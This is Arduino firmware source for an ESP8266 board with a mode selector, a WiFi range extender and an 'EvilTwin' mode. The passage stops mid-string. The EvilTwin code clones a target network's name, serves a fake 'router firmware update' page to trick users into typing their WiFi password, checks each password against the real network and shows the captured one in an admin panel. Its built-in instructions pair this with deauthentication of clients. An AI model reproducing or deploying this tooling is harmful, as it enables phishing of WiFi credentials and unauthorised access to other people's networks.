/*
 * ╔══════════════════════════════════════════════════════════════╗
 * ║           ESP8266 Firmware — Selection UI                    ║
 * ║                       SA SUJON                               ║
 * ╠══════════════════════════════════════════════════════════════╣
 * ║  Modes:                                                      ║
 * ║  1. EvilTwin      — EvilTwin / DeAuth / Captive Portal       ║
 * ║  2. RangeExtender — WiFi Repeater With NAPT                  ║
 * ║                                                              ║
 * ║  On first boot (or after reset) the device starts a WiFi AP  ║
 * ║  named "NodeMCU" and serves a Selection UI at                ║
 * ║  192.168.4.1. From there you can:                            ║
 * ║    • Choose a mode (EvilTwin / RangeExtender)                ║
 * ║    • Upload OTA Firmware Updates                             ║
 * ║    • Reset back to Selection UI                              ║
 * ║                                                              ║
 * ║  Board: ESP8266 NodeMCU 1.0 (ESP-12E)                        ║
 * ║  Flash Size: 4MB (FS: 2MB, OTA: ~1019KB)                     ║
 * ║  lwIP Variant: v2 Higher Bandwidth (NAPT required)           ║
 * ╚══════════════════════════════════════════════════════════════╝
 */

#include <Arduino.h>
#include <ArduinoOTA.h>
#include <DNSServer.h>
#include <EEPROM.h>
#include <ESP8266WebServer.h>
#include <ESP8266WiFi.h>
#include <lwip/dns.h>
#include <lwip/napt.h>

extern "C" {
#include "user_interface.h"
}

// ─── Mode Constants ─────────────────────────────────────────────
#define MODE_SELECTOR 0
#define MODE_FLUXION 1
#define MODE_EXTENDER 2

// ─── EEPROM Layout ──────────────────────────────────────────────
// Bytes 0-510  : Range Extender Config
// Byte  511    : Active mode selector
#define EEPROM_SIZE 512
#define EEPROM_MODE_ADDR 511
#define EEPROM_MAGIC 0xAB

// ─── Range Extender Defines ────────────────────────────────────
#define NAPT_TABLE_SIZE 512
#define NAPT_PORT_MAP_SIZE 32
#define DNS_PORT 53
#define WEB_PORT 80
#define MAX_RECONNECT_TRIES 30
#define STATUS_LED LED_BUILTIN

// ─── Current Active Mode ───────────────────────────────────────
uint8_t activeMode = MODE_SELECTOR;

// ═══════════════════════════════════════════════════════════════
//           SHARED: Web Server, DNS, OTA Upload
// ═══════════════════════════════════════════════════════════════

ESP8266WebServer webServer(WEB_PORT);
DNSServer dnsServer;

// OTA Upload handler (shared by selector + extender)
void handleOTAUpload() {
  HTTPUpload &upload = webServer.upload();
  if (upload.status == UPLOAD_FILE_START) {
    Serial.printf("[OTA] Receiving: %s\n", upload.filename.c_str());
    uint32_t maxSketchSpace = (ESP.getFreeSketchSpace() - 0x1000) & 0xFFFFF000;
    if (!Update.begin(maxSketchSpace)) {
      Update.printError(Serial);
    }
  } else if (upload.status == UPLOAD_FILE_WRITE) {
    if (Update.write(upload.buf, upload.currentSize) != upload.currentSize) {
      Update.printError(Serial);
    }
  } else if (upload.status == UPLOAD_FILE_END) {
    if (Update.end(true)) {
      Serial.printf("[OTA] Update success: %u bytes\n", upload.totalSize);
    } else {
      Update.printError(Serial);
    }
  }
}

// ─── EEPROM Helpers (mode byte) ────────────────────────────────
void saveMode(uint8_t mode) {
  EEPROM.begin(EEPROM_SIZE);
  EEPROM.write(EEPROM_MODE_ADDR, mode);
  EEPROM.commit();
  Serial.printf("[MODE] Saved mode: %d\n", mode);
}

uint8_t loadMode() {
  EEPROM.begin(EEPROM_SIZE);
  uint8_t m = EEPROM.read(EEPROM_MODE_ADDR);
  if (m != MODE_FLUXION && m != MODE_EXTENDER) {
    m = MODE_SELECTOR;
  }
  Serial.printf("[MODE] Loaded mode: %d\n", m);
  return m;
}

// ═══════════════════════════════════════════════════════════════
// ███████████████████  SELECTOR UI  ████████████████████████████
// ═══════════════════════════════════════════════════════════════

const char SELECTOR_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>NodeMCU Actions Menu</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
:root{--bg:#0a0a1a;--surface:#12122a;--card:#1a1a3e;--border:#2a2a5e;--text:#e8e8ff;--text-dim:#8888bb;--accent:#7c3aed;--accent2:#3b82f6;--success:#22c55e;--danger:#ef4444;--glow:rgba(124,58,237,0.3);--glow2:rgba(59,130,246,0.2);--radius:16px;--radius-sm:10px}
body{font-family:'Segoe UI',system-ui,-apple-system,sans-serif;background:var(--bg);color:var(--text);min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
::-webkit-scrollbar{width:6px}::-webkit-scrollbar-track{background:var(--bg)}::-webkit-scrollbar-thumb{background:var(--border);border-radius:3px}

.container{max-width:580px;width:100%}
.header{text-align:center;margin-bottom:32px}
.logo{display:flex;align-items:center;justify-content:center;gap:12px;margin-bottom:12px}
.logo svg{width:40px;height:40px}
.logo-text{font-size:1.6em;font-weight:800;background:linear-gradient(135deg,var(--accent),var(--accent2));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
.subtitle{color:var(--text-dim);font-size:.92em}

.mode-grid{display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-bottom:24px}
.mode-card{background:var(--card);border:2px solid var(--border);border-radius:var(--radius);padding:28px 20px;text-align:center;cursor:pointer;transition:all .3s;position:relative;overflow:hidden}
.mode-card::before{content:'';position:absolute;top:0;left:0;right:0;height:3px;opacity:0;transition:opacity .3s}
.mode-card:hover{border-color:var(--accent);transform:translateY(-4px);box-shadow:0 8px 30px var(--glow)}
.mode-card:hover::before{opacity:1}
.mode-card.fluxion::before{background:linear-gradient(90deg,#ef4444,#f59e0b)}
.mode-card.fluxion:hover{border-color:#ef4444;box-shadow:0 8px 30px rgba(239,68,68,0.25)}
.mode-card.extender::before{background:linear-gradient(90deg,var(--accent),var(--accent2))}

.mode-icon{width:64px;height:64px;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 16px;font-size:1.6em}
.mode-card.fluxion .mode-icon{background:linear-gradient(135deg,rgba(239,68,68,0.2),rgba(245,158,11,0.2))}
.mode-card.extender .mode-icon{background:linear-gradient(135deg,rgba(124,58,237,0.2),rgba(59,130,246,0.2))}
.mode-title{font-size:1.15em;font-weight:700;margin-bottom:8px}
.mode-desc{font-size:.82em;color:var(--text-dim);line-height:1.5}

.ota-card{background:var(--card);border:1px solid var(--border);border-radius:var(--radius);padding:22px;margin-bottom:16px}
.ota-title{font-size:1em;font-weight:600;margin-bottom:12px;display:flex;align-items:center;gap:8px}
.upload-area{border:2px dashed var(--border);border-radius:var(--radius-sm);padding:32px 16px;text-align:center;cursor:pointer;transition:all .3s}
.upload-area:hover,.upload-area.dragover{border-color:var(--accent);background:rgba(124,58,237,0.05)}
.progress-bar{height:6px;background:var(--surface);border-radius:3px;overflow:hidden;margin-top:12px;display:none}
.progress-fill{height:100%;background:linear-gradient(90deg,var(--accent),var(--accent2));border-radius:3px;transition:width .5s ease;width:0%}
.btn{padding:10px 24px;border:none;border-radius:var(--radius-sm);cursor:pointer;font-size:.9em;font-weight:600;transition:all .3s;display:inline-flex;align-items:center;gap:8px;width:100%;justify-content:center;margin-top:12px}
.btn-primary{background:linear-gradient(135deg,var(--accent),var(--accent2));color:#fff}
.btn-primary:hover{transform:translateY(-2px);box-shadow:0 4px 15px var(--glow)}
.btn:disabled{opacity:.4;cursor:not-allowed;transform:none!important}

.footer{text-align:center;font-size:.75em;color:var(--text-dim);margin-top:8px}

.toast{position:fixed;bottom:20px;right:20px;padding:14px 24px;border-radius:var(--radius-sm);color:#fff;font-weight:500;z-index:1000;transform:translateX(120%);transition:transform .4s cubic-bezier(.68,-.55,.27,1.55);max-width:350px}
.toast.show{transform:translateX(0)}
.toast.success{background:var(--success)}
.toast.error{background:var(--danger)}
.toast.info{background:var(--accent)}

@media(max-width:500px){
  .mode-grid{grid-template-columns:1fr}
}
</style>
</head>
<body>

<div class="container">
  <div class="header">
    <div class="logo">
      <svg viewBox="0 0 24 24" fill="none" stroke="url(#sg)" stroke-width="2">
        <defs><linearGradient id="sg" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="#7c3aed"/><stop offset="100%" stop-color="#3b82f6"/></linearGradient></defs>
        <path d="M5 12.55a11 11 0 0 1 14.08 0"/><path d="M1.42 9a16 16 0 0 1 21.16 0"/><path d="M8.53 16.11a6 6 0 0 1 6.95 0"/><circle cx="12" cy="20" r="1" fill="url(#sg)"/>
      </svg>
      <span class="logo-text">NodeMCU</span>
    </div>
    <div class="subtitle">Select a mode to get started</div>
  </div>

  <div class="mode-grid">
    <div class="mode-card fluxion" onclick="selectMode(1)">
      <div class="mode-icon">
        <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#ef4444" stroke-width="2"><path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"/></svg>
      </div>
      <div class="mode-title">EvilTwin</div>
      <div class="mode-desc">EvilTwin, DeAuth Attack, Captive Portal And Password Capture</div>
    </div>
    <div class="mode-card extender" onclick="selectMode(2)">
      <div class="mode-icon">
        <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#7c3aed" stroke-width="2"><path d="M5 12.55a11 11 0 0 1 14.08 0"/><path d="M1.42 9a16 16 0 0 1 21.16 0"/><path d="M8.53 16.11a6 6 0 0 1 6.95 0"/><circle cx="12" cy="20" r="1" fill="#7c3aed"/></svg>
      </div>
      <div class="mode-title">RangeExtender</div>
      <div class="mode-desc">WiFi Repeater With NAPT, Scanner, Settings & Dashboard</div>
    </div>
  </div>

  <div class="ota-card">
    <div class="ota-title">
      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="var(--accent2)" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
      OTA Firmware Update
    </div>
    <form id="ota-form" enctype="multipart/form-data">
      <div class="upload-area" id="upload-area" onclick="document.getElementById('fw-file').click()">
        <div style="font-size:1.8em;margin-bottom:6px">📦</div>
        <div style="font-weight:600;margin-bottom:4px">Drop firmware here or click to browse</div>
        <div style="font-size:.82em;color:var(--text-dim)" id="file-name">No file selected</div>
        <input type="file" id="fw-file" accept=".bin" style="display:none" onchange="fileSelected(this)">
      </div>
      <div class="progress-bar" id="upload-progress-bar"><div class="progress-fill" id="upload-progress"></div></div>
      <div id="upload-status" style="font-size:.82em;color:var(--text-dim);margin-top:8px;display:none"></div>
      <button type="button" class="btn btn-primary" onclick="uploadFirmware()" id="upload-btn" disabled>
        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
        Upload &amp; Install
      </button>
    </form>
  </div>

  <div class="footer">ESP8266 Firmware &bull; SA SUJON</div>
</div>

<div class="toast" id="toast"></div>

<script>
function toast(msg,type){
  var el=document.getElementById('toast');
  el.textContent=msg;el.className='toast '+type;
  el.classList.add('show');
  setTimeout(function(){el.classList.remove('show')},3500);
}

function selectMode(m){
  var name=m===1?'EvilTwin':'RangeExtender';
  if(!confirm('Switch to '+name+' mode? The device will reboot.'))return;
  var xhr=new XMLHttpRequest();
  xhr.open('POST','/api/setmode');
  xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
  xhr.onload=function(){
    toast('Switching to '+name+'... Rebooting','success');
    setTimeout(function(){location.reload()},6000);
  };
  xhr.onerror=function(){toast('Failed to switch mode','error')};
  xhr.send('mode='+m);
}

function fileSelected(input){
  var f=input.files[0];
  if(f){
    document.getElementById('file-name').textContent=f.name+' ('+Math.round(f.size/1024)+'KB)';
    document.getElementById('upload-btn').disabled=false;
  }
}
var ua=document.getElementById('upload-area');
['dragenter','dragover'].forEach(function(e){ua.addEventListener(e,function(ev){ev.preventDefault();ua.classList.add('dragover')})});
['dragleave','drop'].forEach(function(e){ua.addEventListener(e,function(ev){ev.preventDefault();ua.classList.remove('dragover')})});
ua.addEventListener('drop',function(e){
  var f=e.dataTransfer.files[0];
  if(f&&f.name.endsWith('.bin')){
    document.getElementById('fw-file').files=e.dataTransfer.files;
    fileSelected(document.getElementById('fw-file'));
  }
});

function uploadFirmware(){
  var file=document.getElementById('fw-file').files[0];
  if(!file){toast('No file selected','error');return}
  var xhr=new XMLHttpRequest();
  var form=new FormData();
  form.append('firmware',file,file.name);
  document.getElementById('upload-progress-bar').style.display='block';
  document.getElementById('upload-status').style.display='block';
  document.getElementById('upload-btn').disabled=true;
  xhr.upload.addEventListener('progress',function(e){
    if(e.lengthComputable){
      var pct=Math.round((e.loaded/e.total)*100);
      document.getElementById('upload-progress').style.width=pct+'%';
      document.getElementById('upload-status').textContent='Uploading... '+pct+'%';
    }
  });
  xhr.addEventListener('load',function(){
    if(xhr.status===200){
      document.getElementById('upload-status').textContent='Update successful! Rebooting...';
      document.getElementById('upload-status').style.color='var(--success)';
      toast('Firmware updated! Rebooting...','success');
      setTimeout(function(){location.reload()},8000);
    }else{
      document.getElementById('upload-status').textContent='Update failed: '+xhr.responseText;
      document.getElementById('upload-status').style.color='var(--danger)';
      toast('Update failed','error');
      document.getElementById('upload-btn').disabled=false;
    }
  });
  xhr.addEventListener('error',function(){
    document.getElementById('upload-status').textContent='Upload error.';
    document.getElementById('upload-status').style.color='var(--danger)';
    toast('Upload error','error');
    document.getElementById('upload-btn').disabled=false;
  });
  xhr.open('POST','/api/ota');
  xhr.send(form);
}
</script>
</body>
</html>
)rawliteral";

void selectorSetup();
void selectorLoop();

void selectorSetup() {
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1),
                    IPAddress(255, 255, 255, 0));
  WiFi.softAP("NodeMCU", "12345678");
  Serial.println(F("[SELECTOR] AP started: NodeMCU / 12345678"));

  dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());

  // Serve the selector page
  webServer.on("/",
               []() { webServer.send_P(200, "text/html", SELECTOR_HTML); });

  // Set-mode API
  webServer.on("/api/setmode", []() {
    if (webServer.method() != HTTP_POST) {
      webServer.send(405, "application/json", "{\"success\":false}");
      return;
    }
    String modeStr = webServer.arg("mode");
    uint8_t m = modeStr.toInt();
    if (m == MODE_FLUXION || m == MODE_EXTENDER) {
      saveMode(m);
      webServer.send(200, "application/json", "{\"success\":true}");
      delay(1000);
      ESP.restart();
    } else {
      webServer.send(400, "application/json",
                     "{\"success\":false,\"message\":\"Invalid mode\"}");
    }
  });

  // OTA endpoint
  webServer.on(
      "/api/ota", HTTP_POST,
      []() {
        webServer.send(Update.hasError() ? 500 : 200, "text/plain",
                       Update.hasError() ? "Update failed!"
                                         : "Update successful! Rebooting...");
        delay(1000);
        ESP.restart();
      },
      handleOTAUpload);

  // Captive portal
  webServer.onNotFound([]() {
    webServer.sendHeader("Location",
                         "http://" + WiFi.softAPIP().toString() + "/");
    webServer.send(302, "text/plain", "");
  });

  webServer.begin();
  Serial.println(F("[SELECTOR] Web server started on port 80"));
  Serial.println(F("[SELECTOR] Open http://192.168.4.1 to choose mode"));
}

void selectorLoop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
}

// ═══════════════════════════════════════════════════════════════
// ███████████████████  FLUXION MODE  ███████████████████████████
// ═══════════════════════════════════════════════════════════════

typedef struct {
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
} _Network;

_Network _networks[16];
_Network _selectedNetwork;

void clearArray() {
  for (int i = 0; i < 16; i++) {
    _Network _network;
    _networks[i] = _network;
  }
}

String _correct = "";
String _tryPassword = "";

bool hotspot_active = false;
bool deauthing_active = false;

String bytesToStr(const uint8_t *b, uint32_t size) {
  String str;
  const char ZERO = '0';
  const char DOUBLEPOINT = ':';
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10)
      str += ZERO;
    str += String(b[i], HEX);
    if (i < size - 1)
      str += DOUBLEPOINT;
  }
  return str;
}

void fluxionPerformScan() {
  int n = WiFi.scanNetworks();
  clearArray();
  if (n >= 0) {
    for (int i = 0; i < n && i < 16; ++i) {
      _Network network;
      network.ssid = WiFi.SSID(i);
      for (int j = 0; j < 6; j++) {
        network.bssid[j] = WiFi.BSSID(i)[j];
      }
      network.ch = WiFi.channel(i);
      _networks[i] = network;
    }
  }
}

// ── Fluxion Admin Panel HTML ──
String _tempHTML =
    "<!DOCTYPE html><html><head>"
    "<meta name='viewport' content='initial-scale=1.0, width=device-width'>"
    "<style>"
    "*{margin:0;padding:0;box-sizing:border-box}"
    "body{font-family:system-ui,-apple-system,sans-serif;background:#f0f4f8;"
    "color:#1e293b;min-height:100vh}"
    ".w{max-width:700px;margin:0 auto;padding:16px}"
    ".hd{background:linear-gradient(135deg,#1e40af,#3b82f6);color:#fff;padding:"
    "18px "
    "22px;border-radius:12px;margin-bottom:16px;display:flex;align-items:"
    "center;gap:12px}"
    ".hd h1{font-size:1.2em;font-weight:700;letter-spacing:-.01em}"
    ".cd{background:#fff;border-radius:10px;box-shadow:0 1px 3px "
    "rgba(0,0,0,.06),0 1px 2px rgba(0,0,0,.04);padding:18px;margin-bottom:14px}"
    ".cd "
    "h2{font-size:.95em;font-weight:600;color:#475569;margin-bottom:12px;"
    "display:flex;align-items:center;gap:8px}"
    ".act{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:14px}"
    ".b{padding:9px "
    "20px;border:none;border-radius:8px;cursor:pointer;font-size:.84em;font-"
    "weight:600;font-family:inherit;transition:all .15s}"
    ".b:hover{filter:brightness(1.08);transform:translateY(-1px)}"
    ".b:disabled{opacity:.4;cursor:not-allowed;filter:none;transform:none}"
    ".bl{background:#2563eb;color:#fff}"
    ".rd{background:#ef4444;color:#fff}"
    ".gn{background:#16a34a;color:#fff}"
    ".gy{background:#f1f5f9;color:#475569;border:1px solid #e2e8f0}"
    ".nf{padding:12px "
    "16px;border-radius:8px;font-size:.8em;line-height:1.7;color:#64748b;"
    "background:#f8fafc;border:1px solid #e2e8f0;margin-bottom:4px}"
    "table{width:100%;border-collapse:collapse}"
    "th{background:#f8fafc;color:#64748b;font-size:.72em;font-weight:600;text-"
    "transform:uppercase;letter-spacing:.5px;padding:10px "
    "12px;text-align:left;border-bottom:2px solid #e2e8f0}"
    "td{padding:10px 12px;border-bottom:1px solid "
    "#f1f5f9;font-size:.84em;color:#334155}"
    "tr:last-child td{border-bottom:none}"
    "tr:hover td{background:#f8fafc}"
    ".sl td{background:#eff6ff!important}"
    "code{font-size:.82em;color:#64748b;background:#f1f5f9;padding:2px "
    "5px;border-radius:4px}"
    "strong{color:#1e40af}"
    ".pw{padding:14px 16px;border-radius:8px;font-weight:600;font-size:.9em}"
    ".ps{background:#dcfce7;color:#15803d;border-left:4px solid #22c55e}"
    ".ft{text-align:center;font-size:.72em;color:#94a3b8;padding:12px}"
    "@media(max-width:520px){.w{padding:10px}.cd{padding:14px}td,th{padding:"
    "8px;font-size:.78em}.act{flex-direction:column}.b{width:100%;text-align:"
    "center}}"
    "</style>"
    "</head><body><div class='w'>"
    "<div class='hd'>"
    "<svg width='26' height='26' viewBox='0 0 24 24' fill='none' stroke='#fff' "
    "stroke-width='2'>"
    "<path d='M5 12.55a11 11 0 0 1 14.08 0'/>"
    "<path d='M1.42 9a16 16 0 0 1 21.16 0'/>"
    "<path d='M8.53 16.11a6 6 0 0 1 6.95 0'/>"
    "<circle cx='12' cy='20' r='1' fill='#fff'/></svg>"
    "<h1>EvilTwin Control Panel</h1>"
    "<form method='post' action='/reset-mode' style='margin-left:auto'>"
    "<button class='b gy' style='font-size:.72em;padding:6px 12px'>&#8592; "
    "NodeMCU Mode</button></form>"
    "</div>"
    "<div class='cd'>"
    "<h2>&#9881; Actions</h2>"
    "<div class='act'>"
    "<form style='display:inline' method='post' action='/?deauth={deauth}'>"
    "<button class='b {da_cls}'{disabled}>{deauth_button}</button></form>"
    " <form style='display:inline' method='post' action='/?hotspot={hotspot}'>"
    "<button class='b {et_cls}'{disabled}>{hotspot_button}</button></form>"
    "</div>"
    "<div class='nf'>"
    "<strong>How to use:</strong> 1) Select a target network. "
    "2) Start EvilTwin to clone it. "
    "3) Connect to the cloned network &amp; open <em>192.168.4.1/admin</em>. "
    "4) Start deauthing &amp; wait for the correct password. "
    "Once captured, AP resets to default (EvilTwin / 12345678). Remember this attack will not work properly with DualBand Or 5GHZ AP"
    "</div></div>"
    "<div class='cd'>"
    "<h2>&#128225; Available Networks</h2>"
    "<div style='overflow-x:auto'>"
    "<table><tr><th>SSID</th><th>BSSID</th><th>Ch</th><th>Action</th></tr>";

String buildAdminPage() {
  String _html = _tempHTML;

  for (int i = 0; i < 16; ++i) {
    if (_networks[i].ssid == "")
      break;

    if (bytesToStr(_selectedNetwork.bssid, 6) ==
        bytesToStr(_networks[i].bssid, 6)) {
      _html +=
          "<tr class='sl'><td><strong>" + _networks[i].ssid +
          "</strong></td><td><code>" + bytesToStr(_networks[i].bssid, 6) +
          "</code></td><td>" + String(_networks[i].ch) +
          "</td><td><form method='post' action='/?ap=" +
          bytesToStr(_networks[i].bssid, 6) +
          "'><button class='b gn'>&#10003; Selected</button></form></td></tr>";
    } else {
      _html += "<tr><td>" + _networks[i].ssid + "</td><td><code>" +
               bytesToStr(_networks[i].bssid, 6) + "</code></td><td>" +
               String(_networks[i].ch) +
               "</td><td><form method='post' action='/?ap=" +
               bytesToStr(_networks[i].bssid, 6) +
               "'><button class='b gy'>Select</button></form></td></tr>";
    }
  }

  if (deauthing_active) {
    _html.replace("{deauth_button}", "&#9632; Stop Deauthing");
    _html.replace("{deauth}", "stop");
    _html.replace("{da_cls}", "rd");
  } else {
    _html.replace("{deauth_button}", "&#9654; Start Deauthing");
    _html.replace("{deauth}", "start");
    _html.replace("{da_cls}", "bl");
  }

  if (hotspot_active) {
    _html.replace("{hotspot_button}", "&#9632; Stop EvilTwin");
    _html.replace("{hotspot}", "stop");
    _html.replace("{et_cls}", "rd");
  } else {
    _html.replace("{hotspot_button}", "&#9654; Start EvilTwin");
    _html.replace("{hotspot}", "start");
    _html.replace("{et_cls}", "gn");
  }

  if (_selectedNetwork.ssid == "") {
    _html.replace("{disabled}", " disabled");
  } else {
    _html.replace("{disabled}", "");
  }

  _html += "</table></div></div>";

  if (_correct != "") {
    _html += "<div class='cd'><div class='pw ps'>&#128273; " + _correct +
             "</div></div>";
  }

  _html += "<div class='ft'>EvilTwin Designed By SA SUJON</div></div></body></html>";
  return _html;
}

void handleFluxionResult() {
  if (WiFi.status() != WL_CONNECTED) {
    webServer.send(
        200, "text/html",
        "<!DOCTYPE html><html><head>"
        "<script>setTimeout(function(){window.location.href='/';},3000);</"
        "script>"
        "<meta name='viewport' content='initial-scale=1.0, width=device-width'>"
        "<style>"
        "*{margin:0;box-sizing:border-box}"
        "body{font-family:system-ui,sans-serif;background:#f0f4f8;color:#"
        "1e293b;min-height:100vh;display:flex;align-items:center;justify-"
        "content:center}"
        ".cd{background:#fff;border-radius:14px;box-shadow:0 4px 24px "
        "rgba(0,0,0,.08);padding:44px "
        "36px;text-align:center;max-width:400px;margin:16px;width:100%}"
        ".ic{width:56px;height:56px;background:#fee2e2;border-radius:50%;"
        "display:flex;align-items:center;justify-content:center;margin:0 auto "
        "18px}"
        ".ic svg{width:28px;height:28px}"
        "h2{color:#b91c1c;font-size:1.15em;margin-bottom:8px}"
        "p{font-size:.88em;color:#64748b;line-height:1.5}"
        "</style></head><body>"
        "<div class='cd'>"
        "<div class='ic'><svg viewBox='0 0 24 24' fill='none' stroke='#ef4444' "
        "stroke-width='2.5'><line x1='18' y1='6' x2='6' y2='18'/><line x1='6' "
        "y1='6' x2='18' y2='18'/></svg></div>"
        "<h2>Incorrect Password</h2>"
        "<p>The password you entered is incorrect. Redirecting back...</p>"
        "</div></body></html>");
    Serial.println("Wrong password tried !");
  } else {
    webServer.send(
        200, "text/html",
        "<!DOCTYPE html><html><head>"
        "<meta name='viewport' content='initial-scale=1.0, width=device-width'>"
        "<style>"
        "*{margin:0;box-sizing:border-box}"
        "body{font-family:system-ui,sans-serif;background:#f0f4f8;color:#"
        "1e293b;min-height:100vh;display:flex;align-items:center;justify-"
        "content:center}"
        ".cd{background:#fff;border-radius:14px;box-shadow:0 4px 24px "
        "rgba(0,0,0,.08);padding:44px "
        "36px;text-align:center;max-width:400px;margin:16px;width:100%}"
        ".ic{width:56px;height:56px;background:#dcfce7;border-radius:50%;"
        "display:flex;align-items:center;justify-content:center;margin:0 auto "
        "18px}"
        ".ic svg{width:28px;height:28px}"
        "h2{color:#15803d;font-size:1.15em;margin-bottom:8px}"
        "p{font-size:.88em;color:#64748b;line-height:1.5}"
        "</style></head><body>"
        "<div class='cd'>"
        "<div class='ic'><svg viewBox='0 0 24 24' fill='none' stroke='#22c55e' "
        "stroke-width='2.5'><polyline points='20 6 9 17 4 12'/></svg></div>"
        "<h2>Update Successful</h2>"
        "<p>Your router firmware has been updated successfully. The connection "
        "will resume shortly.</p>"
        "</div></body></html>");
    hotspot_active = false;
    dnsServer.stop();
    int n = WiFi.softAPdisconnect(true);
    Serial.println(String(n));
    WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1),
                      IPAddress(255, 255, 255, 0));
    WiFi.softAP("EvilTwin", "12345678");
    dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    _correct = "Successfully got password for: " + _selectedNetwork.ssid +
               " Password: " + _tryPassword;
    Serial.println("Good password was entered !");
    Serial.println(_correct);
  }
}

void handleFluxionIndex() {
  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap")) {
        _selectedNetwork = _networks[i];
      }
    }
  }

  if (webServer.hasArg("deauth")) {
    if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
    } else if (webServer.arg("deauth") == "stop") {
      deauthing_active = false;
    }
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect(true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1),
                        IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    } else if (webServer.arg("hotspot") == "stop") {
      hotspot_active = false;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect(true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1),
                        IPAddress(255, 255, 255, 0));
      WiFi.softAP("EvilTwin", "12345678");
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    }
    return;
  }

  if (hotspot_active == false) {
    webServer.send(200, "text/html", buildAdminPage());
  } else {
    if (webServer.hasArg("password")) {
      _tryPassword = webServer.arg("password");
      WiFi.disconnect();
      WiFi.begin(_selectedNetwork.ssid.c_str(),
                 webServer.arg("password").c_str(), _selectedNetwork.ch,
                 _selectedNetwork.bssid);
      webServer.send(
          200, "text/html",
          "<!DOCTYPE html><html><head>"
          "<script>setTimeout(function(){window.location.href='/"
          "result';},15000);</script>"
          "<meta name='viewport' content='initial-scale=1.0, "
          "width=device-width'>"
          "<style>"
          "*{margin:0;box-sizing:border-box}"
          "body{font-family:system-ui,sans-serif;background:#f0f4f8;color:#"
          "1e293b;min-height:100vh;display:flex;align-items:center;justify-"
          "content:center}"
          ".cd{background:#fff;border-radius:14px;box-shadow:0 4px 24px "
          "rgba(0,0,0,.08);padding:44px "
          "36px;text-align:center;max-width:400px;margin:16px;width:100%}"
          ".sp{display:inline-block;width:40px;height:40px;border:3px solid "
          "#e2e8f0;border-top-color:#2563eb;border-radius:50%;animation:r .7s "
          "linear infinite;margin-bottom:18px}"
          "@keyframes r{to{transform:rotate(360deg)}}"
          "h2{font-size:1.1em;margin-bottom:8px}"
          "p{font-size:.88em;color:#64748b;line-height:1.5}"
          "</style></head><body>"
          "<div class='cd'>"
          "<div class='sp'></div>"
          "<h2>Installing Update</h2>"
          "<p>Please wait while the firmware is being verified and installed. "
          "This may take a moment...</p>"
          "</div></body></html>");
    } else {
      webServer.send(
          200, "text/html",
          "<!DOCTYPE html><html><head>"
          "<meta name='viewport' content='initial-scale=1.0, "
          "width=device-width'>"
          "<style>"
          "*{margin:0;padding:0;box-sizing:border-box}"
          "body{font-family:system-ui,sans-serif;background:#f0f4f8;color:#"
          "1e293b;min-height:100vh;display:flex;align-items:center;justify-"
          "content:center}"
          ".w{max-width:420px;width:100%;padding:16px}"
          ".cd{background:#fff;border-radius:14px;box-shadow:0 4px 24px "
          "rgba(0,0,0,.08);padding:36px 32px;text-align:center}"
          ".ic{width:60px;height:60px;background:linear-gradient(135deg,#"
          "dbeafe,#eff6ff);border-radius:50%;display:flex;align-items:center;"
          "justify-content:center;margin:0 auto 18px}"
          "h1{font-size:1.2em;font-weight:700;color:#1e293b;margin-bottom:8px}"
          ".sub{font-size:.88em;color:#64748b;margin-bottom:22px;line-height:1."
          "6}"
          ".net{font-weight:700;color:#2563eb}"
          ".fg{margin-bottom:18px;text-align:left}"
          "label{font-size:.88em;color:#374151;font-weight:600}"
          "input[type=text]{width:100%;padding:11px 14px;border:1px solid "
          "#d1d5db;border-radius:8px;font-size:.92em;margin-top:7px;outline:"
          "none;font-family:inherit;transition:border .2s,box-shadow .2s}"
          "input:focus{border-color:#2563eb;box-shadow:0 0 0 3px "
          "rgba(37,99,235,.12)}"
          ".btn{width:100%;padding:12px;border:none;border-radius:8px;"
          "background:linear-gradient(135deg,#2563eb,#1d4ed8);color:#fff;font-"
